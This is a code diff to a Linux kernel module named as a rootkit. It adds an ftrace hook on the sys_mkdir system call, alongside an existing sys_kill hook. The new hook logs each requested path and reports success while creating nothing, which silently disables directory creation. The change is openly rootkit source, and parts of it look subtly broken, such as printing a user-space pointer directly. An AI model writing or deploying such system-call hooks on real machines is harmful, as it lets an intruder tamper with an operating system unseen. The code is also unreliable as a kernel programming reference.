@@ -34,6 +34,15 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     return orig_kill(regs);
 
 }
+
+static asmlinkage long (*original_mkdir)(const char*, umode_t);
+static asmlinkage long custom_mkdir(const char __user *pathname, umode_t mode)
+{
+    printk("mkdir pathname: %s\n", pathname);
+    printk(KERN_INFO "mkdir do nothing!\n");
+    return 0; /*everything is ok, but he new systemcall does nothing*/
+}
+
 #else
 
 static asmlinkage long (*origin_kill)(pid_t pid, int sig);
@@ -57,6 +66,7 @@ static asmlinkage long custom_mkdir(const char __user *pathname, umode_t mode)
 
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &origin_kill),
+    HOOK("sys_mkdir", custom_mkdir, &original_mkdir),
 };
 
 static int __init rootkit_init(void)
